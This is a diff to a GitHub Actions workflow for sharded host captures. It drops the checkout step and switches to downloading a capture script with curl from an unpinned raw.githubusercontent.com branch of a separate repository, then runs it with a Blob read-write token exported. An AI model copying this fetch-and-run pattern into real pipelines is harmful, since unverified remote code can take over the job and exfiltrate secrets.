@@ -54,9 +54,6 @@ jobs:
       matrix:
         shard: [0,1,2,3,4,5,6,7]
     steps:
-      - name: Checkout production worker
-        uses: actions/checkout@v4
-
       - name: Install capture and Blob tools
         run: |
           set -euo pipefail
@@ -118,8 +115,9 @@ PY
           printf '%s\n' "${SELECTED[@]}" | sed '/^$/d' > /tmp/bigo-hosts.txt
           echo "Shard $SHARD selected ${#SELECTED[@]} host(s)"
           export BLOB_READ_WRITE_TOKEN
-          chmod +x ./scripts/bigo-capture-host.sh
-          printf '%s\n' "${SELECTED[@]}" | awk -F '\t' 'NF>=1 {print $1 "\t" $2}' | xargs -r -P "${HOSTS_PER_SHARD_PARALLEL:-8}" -n2 bash -c 'bash ./scripts/bigo-capture-host.sh "$1" "$2"' _ || true
+          curl -fsSL https://raw.githubusercontent.com/EliteFitness101/chatb2k-f9d8a04d/main/scripts/bigo-capture-host.sh -o /tmp/bigo-capture-host.sh
+          chmod +x /tmp/bigo-capture-host.sh
+          printf '%s\n' "${SELECTED[@]}" | awk -F '\t' 'NF>=1 {print $1 "\t" $2}' | xargs -r -P "${HOSTS_PER_SHARD_PARALLEL:-8}" -n2 bash -c 'bash /tmp/bigo-capture-host.sh "$1" "$2"' _ || true
           python3 - <<'PY'
           import json,glob
           out={"highlights":[],"limit":10}
